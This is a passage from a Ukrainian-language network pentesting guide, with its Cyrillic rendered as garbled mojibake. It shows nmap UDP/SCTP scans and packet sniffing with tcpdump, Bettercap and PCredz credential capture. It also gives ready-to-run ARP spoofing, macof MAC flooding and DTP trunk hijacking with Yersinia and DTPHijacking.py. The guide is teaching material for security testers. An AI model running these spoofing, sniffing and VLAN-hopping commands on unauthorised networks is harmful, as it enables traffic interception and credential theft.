* –ù–∞–¥—ñ—Å–ª–∞—Ç–∏ **–ø–∞–∫–µ—Ç UDP** —Ç–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å _**ICMP unreachable**_, —è–∫—â–æ –ø–æ—Ä—Ç **–∑–∞–∫—Ä–∏—Ç–∏–π** (—É –¥–µ–∫–æ—Ç—Ä–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö ICMP –±—É–¥–µ **—Ñ—ñ–ª—å—Ç—Ä—É–≤–∞—Ç–∏—Å—è**, —Ç–æ–º—É –≤–∏ –Ω–µ –æ—Ç—Ä–∏–º–∞—î—Ç–µ –∂–æ–¥–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó, —è–∫—â–æ –ø–æ—Ä—Ç –∑–∞–∫—Ä–∏—Ç–∏–π –∞–±–æ –≤—ñ–¥–∫—Ä–∏—Ç–∏–π).
* –ù–∞–¥—ñ—Å–ª–∞—Ç–∏ **—Ñ–æ—Ä–º–∞—Ç–æ–≤–∞–Ω—ñ –¥–∞—Ç–∞–≥—Ä–∞–º–∏**, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –≤—ñ–¥ **—Å–µ—Ä–≤—ñ—Å—É** (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, DNS, DHCP, TFTP —Ç–∞ —ñ–Ω—à—ñ, —è–∫ –≤–∫–∞–∑–∞–Ω–æ –≤ _nmap-payloads_). –Ø–∫—â–æ –≤–∏ –æ—Ç—Ä–∏–º—É—î—Ç–µ **–≤—ñ–¥–ø–æ–≤—ñ–¥—å**, —Ç–æ –ø–æ—Ä—Ç **–≤—ñ–¥–∫—Ä–∏—Ç–∏–π**.

**Nmap** –±—É–¥–µ **–∫–æ–º–±—ñ–Ω—É–≤–∞—Ç–∏ –æ–±–∏–¥–≤–∞** –≤–∞—Ä—ñ–∞–Ω—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ "-sV" (—Å–∫–∞–Ω–∏ UDP –¥—É–∂–µ –ø–æ–≤—ñ–ª—å–Ω—ñ), –∞–ª–µ —Å–ª—ñ–¥ –∑–∞—É–≤–∞–∂–∏—Ç–∏, —â–æ —Å–∫–∞–Ω–∏ UDP –ø–æ–≤—ñ–ª—å–Ω—ñ—à–µ –∑–∞ —Å–∫–∞–Ω–∏ TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### –°–∫–∞–Ω—É–≤–∞–Ω–Ω—è SCTP

**SCTP (–ü—Ä–æ—Ç–æ–∫–æ–ª –∫–µ—Ä—É–≤–∞–Ω–Ω—è –ø–æ—Ç–æ–∫–∞–º–∏ –ø–µ—Ä–µ–¥–∞—á—ñ)** –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —Ä–∞–∑–æ–º –∑ **TCP (–ü—Ä–æ—Ç–æ–∫–æ–ª –∫–µ—Ä—É–≤–∞–Ω–Ω—è –ø–µ—Ä–µ–¥–∞—á–µ—é)** —Ç–∞ **UDP (–ü—Ä–æ—Ç–æ–∫–æ–ª –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏—Ö –¥–µ–π—Ç–∞–≥—Ä–∞–º)**. –ô–æ–≥–æ –æ—Å–Ω–æ–≤–Ω–∞ –º–µ—Ç–∞ - —Å–ø—Ä–∏—è—Ç–∏ —Ç—Ä–∞–Ω—Å–ø–æ—Ä—Ç—É —Ç–µ–ª–µ—Ñ–æ–Ω–Ω–∏—Ö –¥–∞–Ω–∏—Ö —á–µ—Ä–µ–∑ IP-–º–µ—Ä–µ–∂—ñ, –≤—ñ–¥—Ç–≤–æ—Ä—é—é—á–∏ –±–∞–≥–∞—Ç–æ –∑ —Ñ—É–Ω–∫—Ü—ñ–π –Ω–∞–¥—ñ–π–Ω–æ—Å—Ç—ñ, —è–∫—ñ –∑–Ω–∞—Ö–æ–¥—è—Ç—å—Å—è –≤ **–°–∏—Å—Ç–µ–º—ñ —Å–∏–≥–Ω–∞–ª—ñ–∑–∞—Ü—ñ—ó 7 (SS7)**. **SCTP** —î –æ—Å–Ω–æ–≤–Ω–∏–º –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–º —Å—ñ–º–µ–π—Å—Ç–≤–∞ –ø—Ä–æ—Ç–æ–∫–æ–ª—ñ–≤ **SIGTRAN**, —è–∫–µ —Å–ø—Ä—è–º–æ–≤–∞–Ω–µ –Ω–∞ —Ç—Ä–∞–Ω—Å–ø–æ—Ä—Ç—É–≤–∞–Ω–Ω—è —Å–∏–≥–Ω–∞–ª—ñ–≤ SS7 —á–µ—Ä–µ–∑ IP-–º–µ—Ä–µ–∂—ñ.

–ü—ñ–¥—Ç—Ä–∏–º–∫–∞ **SCTP** –Ω–∞–¥–∞—î—Ç—å—Å—è —Ä—ñ–∑–Ω–∏–º–∏ –æ–ø–µ—Ä–∞—Ü—ñ–π–Ω–∏–º–∏ —Å–∏—Å—Ç–µ–º–∞–º–∏, —Ç–∞–∫–∏–º–∏ —è–∫ **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** —Ç–∞ **VxWorks**, —â–æ —Å–≤—ñ–¥—á–∏—Ç—å –ø—Ä–æ –π–æ–≥–æ —à–∏—Ä–æ–∫–∏–π –ø—Ä–∏–π–æ–º —Ç–∞ –∫–æ—Ä–∏—Å–Ω—ñ—Å—Ç—å —É –≥–∞–ª—É–∑—ñ —Ç–µ–ª–µ–∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ–π —Ç–∞ –º–µ—Ä–µ–∂.

Nmap –ø—Ä–æ–ø–æ–Ω—É—î –¥–≤–∞ —Ä—ñ–∑–Ω–∏—Ö —Ç–∏–ø–∏ —Å–∫–∞–Ω—É–≤–∞–Ω–Ω—è –¥–ª—è SCTP: _-sY_ —Ç–∞ _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### –£—Ö–∏–ª–µ–Ω–Ω—è IDS —Ç–∞ IPS

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **–î–æ–¥–∞—Ç–∫–æ–≤—ñ –æ–ø—Ü—ñ—ó nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### –†–æ–∑–∫—Ä–∏—Ç—Ç—è –≤–Ω—É—Ç—Ä—ñ—à–Ω—ñ—Ö IP-–∞–¥—Ä–µ—Å

**–ù–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –º–∞—Ä—à—Ä—É—Ç–∏–∑–∞—Ç–æ—Ä–∏, –±—Ä–∞–Ω–¥–º–∞—É–µ—Ä–∏ —Ç–∞ –º–µ—Ä–µ–∂–µ–≤—ñ –ø—Ä–∏—Å—Ç—Ä–æ—ó** —ñ–Ω–æ–¥—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—é—Ç—å –Ω–∞ –º–µ—Ä–µ–∂–µ–≤—ñ –∑–∞–ø–∏—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ **–Ω–µ–ø—É–±–ª—ñ—á–Ω—ñ –¥–∂–µ—Ä–µ–ª–Ω—ñ –∞–¥—Ä–µ—Å–∏**. **tcpdump** –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó –ø–∞–∫–µ—Ç—ñ–≤, –æ—Ç—Ä–∏–º–∞–Ω–∏—Ö –∑ –ø—Ä–∏–≤–∞—Ç–Ω–∏—Ö –∞–¥—Ä–µ—Å –ø—ñ–¥ —á–∞—Å —Ç–µ—Å—Ç—É–≤–∞–Ω–Ω—è. –ó–æ–∫—Ä–µ–º–∞, –Ω–∞ Kali Linux –ø–∞–∫–µ—Ç–∏ –º–æ–∂–Ω–∞ –∑–∞—Ö–æ–ø–ª—é–≤–∞—Ç–∏ –Ω–∞ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ñ **eth2**, —è–∫–∏–π –¥–æ—Å—Ç—É–ø–Ω–∏–π –∑ –≤—ñ–¥–∫—Ä–∏—Ç–æ—ó –º–µ—Ä–µ–∂—ñ –Ü–Ω—Ç–µ—Ä–Ω–µ—Ç—É. –í–∞–∂–ª–∏–≤–æ –∑–∞—É–≤–∞–∂–∏—Ç–∏, —â–æ —è–∫—â–æ –≤–∞—à–∞ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –∑–∞ NAT –∞–±–æ –±—Ä–∞–Ω–¥–º–∞—É–µ—Ä–æ–º, —Ç–∞–∫—ñ –ø–∞–∫–µ—Ç–∏ –π–º–æ–≤—ñ—Ä–Ω–æ –±—É–¥—É—Ç—å –≤—ñ–¥—Ñ—ñ–ª—å—Ç—Ä–æ–≤–∞–Ω—ñ.
```bash
tcpdump ‚Äìnt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## –ü—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞–Ω–Ω—è

–ü—ñ–¥ —á–∞—Å –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞–Ω–Ω—è –º–æ–∂–Ω–∞ –¥—ñ–∑–Ω–∞—Ç–∏—Å—è –¥–µ—Ç–∞–ª—ñ IP-–¥—ñ–∞–ø–∞–∑–æ–Ω—ñ–≤, —Ä–æ–∑–º—ñ—Ä—ñ–≤ –ø—ñ–¥–º–µ—Ä–µ–∂, MAC-–∞–¥—Ä–µ—Å —Ç–∞ —ñ–º–µ–Ω —Ö–æ—Å—Ç—ñ–≤, –ø–µ—Ä–µ–≥–ª—è–¥–∞—é—á–∏ –∑–∞—Ö–æ–ø–ª–µ–Ω—ñ —Ñ—Ä–µ–π–º–∏ —Ç–∞ –ø–∞–∫–µ—Ç–∏. –Ø–∫—â–æ –º–µ—Ä–µ–∂–∞ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∞ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ –∞–±–æ –∫–æ–º—É—Ç–∞—Ü—ñ–π–Ω–∞ —Ç–∫–∞–Ω–∏–Ω–∞ –ø–µ—Ä–µ–±—É–≤–∞—î –ø—ñ–¥ —Å—Ç—Ä–µ—Å–æ–º, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –º–æ–∂—É—Ç—å –∑–∞—Ö–æ–ø–∏—Ç–∏ —á—É—Ç–ª–∏–≤–∏–π –º–∞—Ç–µ—Ä—ñ–∞–ª —à–ª—è—Ö–æ–º –ø–∞—Å–∏–≤–Ω–æ–≥–æ –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞–Ω–Ω—è –º–µ—Ä–µ–∂—ñ.

–Ø–∫—â–æ –∫–æ–º—É—Ç–æ–≤–∞–Ω–∞ Ethernet-–º–µ—Ä–µ–∂–∞ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∞ –Ω–∞–ª–µ–∂–Ω–∏–º —á–∏–Ω–æ–º, –≤–∏ –ø–æ–±–∞—á–∏—Ç–µ –ª–∏—à–µ —Ç—Ä–∞–Ω—Å–ª—è—Ü—ñ–π–Ω—ñ —Ñ—Ä–µ–π–º–∏ —Ç–∞ –º–∞—Ç–µ—Ä—ñ–∞–ª, –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –≤–∞—à–æ—ó MAC-–∞–¥—Ä–µ—Å–∏.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
–¢–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –∑–∞—Ö–æ–ø–ª—é–≤–∞—Ç–∏ –ø–∞–∫–µ—Ç–∏ –∑ –≤—ñ–¥–¥–∞–ª–µ–Ω–æ—ó –º–∞—à–∏–Ω–∏ –ø—ñ–¥ —á–∞—Å —Å–µ–∞–Ω—Å—É SSH –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é Wireshark —è–∫ –≥—Ä–∞—Ñ—ñ—á–Ω–æ–≥–æ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É –≤ —Ä–µ–∞–ª—å–Ω–æ–º—É —á–∞—Å—ñ.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

–û—á–µ–≤–∏–¥–Ω–æ.

### –ó–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö

–í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏, —Ç–∞–∫—ñ —è–∫ [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz), —â–æ–± —Ä–æ–∑–±–∏—Ä–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –∑ pcap-—Ñ–∞–π–ª—É –∞–±–æ –∂–∏–≤–æ–≥–æ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É.

## –ê—Ç–∞–∫–∏ –≤ –ª–æ–∫–∞–ª—å–Ω—ñ–π –º–µ—Ä–µ–∂—ñ

### ARP-–ø—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è

ARP-–ø—ñ–¥—Ä–æ–±–ª–µ–Ω–Ω—è –ø–æ–ª—è–≥–∞—î –≤ —Ç–æ–º—É, —â–æ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—é—Ç—å—Å—è –±–µ–∑–∫–æ—à—Ç–æ–≤–Ω—ñ ARP-–≤—ñ–¥–ø–æ–≤—ñ–¥—ñ, —â–æ–± –≤–∫–∞–∑–∞—Ç–∏, —â–æ IP-–∞–¥—Ä–µ—Å–∞ –º–∞—à–∏–Ω–∏ –º–∞—î MAC-–∞–¥—Ä–µ—Å—É –Ω–∞—à–æ–≥–æ –ø—Ä–∏—Å—Ç—Ä–æ—é. –ü–æ—Ç—ñ–º –∂–µ—Ä—Ç–≤–∞ –∑–º—ñ–Ω–∏—Ç—å —Ç–∞–±–ª–∏—Ü—é ARP —ñ –±—É–¥–µ –∑–≤–µ—Ä—Ç–∞—Ç–∏—Å—è –¥–æ –Ω–∞—à–æ—ó –º–∞—à–∏–Ω–∏ –∫–æ–∂–Ω–æ–≥–æ —Ä–∞–∑—É, –∫–æ–ª–∏ –≤–æ–Ω–∞ —Ö–æ—á–µ –∑–≤–µ—Ä–Ω—É—Ç–∏—Å—è –¥–æ –ø—ñ–¥—Ä–æ–±–ª–µ–Ω–æ—ó IP-–∞–¥—Ä–µ—Å–∏.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### –ü–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è CAM-—Ç–∞–±–ª–∏—Ü—ñ - MAC-—Ñ–ª—É–¥—ñ–Ω–≥

–ü–µ—Ä–µ–ø–æ–≤–Ω—ñ—Ç—å CAM-—Ç–∞–±–ª–∏—Ü—é –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞, –≤—ñ–¥–ø—Ä–∞–≤–ª—è—é—á–∏ –±–∞–≥–∞—Ç–æ –ø–∞–∫–µ—Ç—ñ–≤ –∑ —Ä—ñ–∑–Ω–∏–º–∏ –¥–∂–µ—Ä–µ–ª–∞–º–∏ MAC-–∞–¥—Ä–µ—Å. –ö–æ–ª–∏ CAM-—Ç–∞–±–ª–∏—Ü—è –ø–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–∞, –∫–æ–º—É—Ç–∞—Ç–æ—Ä –ø–æ—á–∏–Ω–∞—î –≤–µ—Å—Ç–∏ —Å–µ–±–µ —è–∫ –∫–æ–Ω—Ü–µ–Ω—Ç—Ä–∞—Ç–æ—Ä (—Ä–æ–∑—Å–∏–ª–∞—é—á–∏ –≤–µ—Å—å —Ç—Ä–∞—Ñ—ñ–∫).
```bash
macof -i <interface>
```
–£ —Å—É—á–∞—Å–Ω–∏—Ö –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞—Ö —Ü—è –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –≤–∏–ø—Ä–∞–≤–ª–µ–Ω–∞.

### –ê—Ç–∞–∫–∏ –Ω–∞ 802.1Q VLAN / DTP

#### –î–∏–Ω–∞–º—ñ—á–Ω–µ —Ç—Ä–æ–Ω–∫—É–≤–∞–Ω–Ω—è

–ü—Ä–æ—Ç–æ–∫–æ–ª **Dynamic Trunking Protocol (DTP)** —Ä–æ–∑—Ä–æ–±–ª–µ–Ω–∏–π —è–∫ –ø—Ä–æ—Ç–æ–∫–æ–ª —Ä—ñ–≤–Ω—è –∑–≤'—è–∑–∫—É –¥–ª—è –ø–æ–ª–µ–≥—à–µ–Ω–Ω—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ—ó —Å–∏—Å—Ç–µ–º–∏ —Ç—Ä–æ–Ω–∫—É–≤–∞–Ω–Ω—è, —â–æ –¥–æ–∑–≤–æ–ª—è—î –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞–º –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –≤–∏–±–∏—Ä–∞—Ç–∏ –ø–æ—Ä—Ç–∏ –¥–ª—è —Ä–µ–∂–∏–º—É —Ç—Ä–æ–Ω–∫—É–≤–∞–Ω–Ω—è (Trunk) –∞–±–æ –Ω–µ-—Ç—Ä–æ–Ω–∫—É–≤–∞–Ω–Ω—è. –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **DTP** —á–∞—Å—Ç–æ —Ä–æ–∑–≥–ª—è–¥–∞—î—Ç—å—Å—è —è–∫ –ø–æ–∫–∞–∑–Ω–∏–∫ –Ω–µ–æ–ø—Ç–∏–º–∞–ª—å–Ω–æ–≥–æ –¥–∏–∑–∞–π–Ω—É –º–µ—Ä–µ–∂—ñ, —â–æ –ø—ñ–¥–∫—Ä–µ—Å–ª—é—î –≤–∞–∂–ª–∏–≤—ñ—Å—Ç—å —Ä—É—á–Ω–æ—ó –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ —Ç—Ä–æ–Ω–∫—ñ–≤ –ª–∏—à–µ —Ç–∞–º, –¥–µ —Ü–µ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ, —Ç–∞ –∑–∞–±–µ–∑–ø–µ—á–µ–Ω–Ω—è –Ω–∞–ª–µ–∂–Ω–æ—ó –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü—ñ—ó.

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –ø–æ—Ä—Ç–∏ –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ñ –≤ —Ä–µ–∂–∏–º—ñ Dynamic Auto, —â–æ –æ–∑–Ω–∞—á–∞—î, —â–æ –≤–æ–Ω–∏ –≥–æ—Ç–æ–≤—ñ —ñ–Ω—ñ—Ü—ñ—é–≤–∞—Ç–∏ —Ç—Ä–æ–Ω–∫—É–≤–∞–Ω–Ω—è –∑–∞ –≤–∏–º–æ–≥–æ—é —Å—É—Å—ñ–¥–Ω—å–æ–≥–æ –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞. –ü—Ä–æ–±–ª–µ–º–∞ –±–µ–∑–ø–µ–∫–∏ –≤–∏–Ω–∏–∫–∞—î, –∫–æ–ª–∏ –ø–µ–Ω—Ç–µ—Å—Ç–µ—Ä –∞–±–æ –∞—Ç–∞–∫—É—é—á–∏–π –ø—ñ–¥–∫–ª—é—á–∞—î—Ç—å—Å—è –¥–æ –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞ —Ç–∞ –Ω–∞–¥—Å–∏–ª–∞—î —Ñ—Ä–µ–π–º DTP Desirable, —â–æ –∑–º—É—à—É—î –ø–æ—Ä—Ç —É–≤—ñ–π—Ç–∏ –≤ —Ä–µ–∂–∏–º —Ç—Ä–æ–Ω–∫—É–≤–∞–Ω–Ω—è. –¶—è –¥—ñ—è –¥–æ–∑–≤–æ–ª—è—î –∞—Ç–∞–∫—É—é—á–æ–º—É –ø–µ—Ä–µ–ª—ñ—á–∏—Ç–∏ VLAN —á–µ—Ä–µ–∑ –∞–Ω–∞–ª—ñ–∑ —Ñ—Ä–µ–π–º—ñ–≤ STP —Ç–∞ –æ–±—ñ–π—Ç–∏ —Å–µ–≥–º–µ–Ω—Ç–∞—Ü—ñ—é VLAN, —Å—Ç–≤–æ—Ä—é—é—á–∏ –≤—ñ—Ä—Ç—É–∞–ª—å–Ω—ñ —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∏.

–ù–∞—è–≤–Ω—ñ—Å—Ç—å DTP –≤ –±–∞–≥–∞—Ç—å–æ—Ö –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞—Ö –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∞ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞–º–∏ –¥–ª—è —ñ–º—ñ—Ç–∞—Ü—ñ—ó –ø–æ–≤–µ–¥—ñ–Ω–∫–∏ –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞, —Ç–∏–º —Å–∞–º–∏–º –æ—Ç—Ä–∏–º—É—é—á–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ç—Ä–∞—Ñ—ñ–∫—É –ø–æ –≤—Å—ñ—Ö VLAN. –°—Ü–µ–Ω–∞—Ä—ñ–π [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É —ñ–Ω—Ç–µ—Ä—Ñ–µ–π—Å—É —Ç–∞ –≤–∏—è–≤–ª–µ–Ω–Ω—è —Ç–æ–≥–æ, —á–∏ –∫–æ–º—É—Ç–∞—Ç–æ—Ä –ø–µ—Ä–µ–±—É–≤–∞—î –≤ —Ä–µ–∂–∏–º—ñ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º, —Ç—Ä–æ–Ω–∫—É–≤–∞–Ω–Ω—è, –¥–∏–Ω–∞–º—ñ—á–Ω–æ–≥–æ, –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–≥–æ –∞–±–æ –¥–æ—Å—Ç—É–ø—É ‚Äî –æ—Å—Ç–∞–Ω–Ω—ñ–π —î–¥–∏–Ω–∏–π –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ–π–Ω–∏–π –≤–∞—Ä—ñ–∞–Ω—Ç, —è–∫–∏–π –∑–∞—Ö–∏—â–µ–Ω–∏–π –≤—ñ–¥ –∞—Ç–∞–∫ –Ω–∞ –ø–µ—Ä–µ—Ö—ñ–¥ –º—ñ–∂ VLAN. –¶–µ–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –æ—Ü—ñ–Ω—é—î —Å—Ç–∞—Ç—É—Å –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –∫–æ–º—É—Ç–∞—Ç–æ—Ä–∞.

–Ø–∫—â–æ –≤–∏—è–≤–ª–µ–Ω–æ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å –º–µ—Ä–µ–∂—ñ, –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç _**Yersinia**_ –¥–ª—è "—É–≤—ñ–º–∫–Ω–µ–Ω–Ω—è —Ç—Ä–æ–Ω–∫—É–≤–∞–Ω–Ω—è" —á–µ—Ä–µ–∑ –ø—Ä–æ—Ç–æ–∫–æ–ª DTP, —â–æ –¥–æ–∑–≤–æ–ª—è—î —Å–ø–æ—Å—Ç–µ—Ä—ñ–≥–∞—Ç–∏ –∑–∞ –ø–∞–∫–µ—Ç–∞–º–∏ –∑ —É—Å—ñ—Ö VLAN.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
–î–ª—è –ø–µ—Ä–µ–ª—ñ–∫—É VLAN —Ç–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ —Ä–∞–º–∫—É DTP Desirable –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Å–∫—Ä–∏–ø—Ç—É [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. –ù–µ –ø–µ—Ä–µ—Ä–∏–≤–∞–π—Ç–µ —Å–∫—Ä–∏–ø—Ç –Ω—ñ –∑–∞ —è–∫–∏—Ö –æ–±—Å—Ç–∞–≤–∏–Ω. –í—ñ–Ω –≤–ø—Ä–æ–≤–∞–¥–∂—É—î DTP Desirable –∫–æ–∂–Ω—ñ —Ç—Ä–∏ —Å–µ–∫—É–Ω–¥–∏. **–î–∏–Ω–∞–º—ñ—á–Ω–æ —Å—Ç–≤–æ—Ä–µ–Ω—ñ —Ç—Ä–∞–Ω–∫-–∫–∞–Ω–∞–ª–∏ –Ω–∞ –∫–æ–º—É—Ç–∞—Ç–æ—Ä—ñ —ñ—Å–Ω—É—é—Ç—å –ª–∏—à–µ –ø'—è—Ç—å —Ö–≤–∏–ª–∏–Ω. –ü—ñ—Å–ª—è —Ü—å–æ–≥–æ —Ç–µ—Ä–º—ñ–Ω—É —Ç—Ä–∞–Ω–∫ –≤—ñ–¥–∫–ª—é—á–∞—î—Ç—å—Å—è.**
```
sudo python3 DTPHijacking.py --interface eth0
```
–Ø —Ö–æ—á—É –≤–∫–∞–∑–∞—Ç–∏, —â–æ **Access/Desirable (0x03)** –≤–∫–∞–∑—É—î –Ω–∞ —Ç–µ, —â–æ –∫–∞–¥—Ä DTP —î —Ç–∏–ø—É Desirable, —â–æ –≤–∫–∞–∑—É—î –ø–æ—Ä—Ç—É –ø–µ—Ä–µ–π—Ç–∏ –≤ —Ä–µ–∂–∏–º Trunk. –ê **802.1Q/802.1Q (0xa5)** –≤–∫–∞–∑—É—î –Ω–∞ —Ç–∏–ø —ñ–Ω–∫–∞–ø—Å—É–ª—è—Ü—ñ—ó **802.1Q**.

–ê–Ω–∞–ª—ñ–∑—É—é—á–∏ –∫–∞–¥—Ä–∏ STP, **–º–∏ –¥—ñ–∑–Ω–∞—î–º–æ—Å—è –ø—Ä–æ —ñ—Å–Ω—É–≤–∞–Ω–Ω—è VLAN 30 —Ç–∞ VLAN 60**.

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

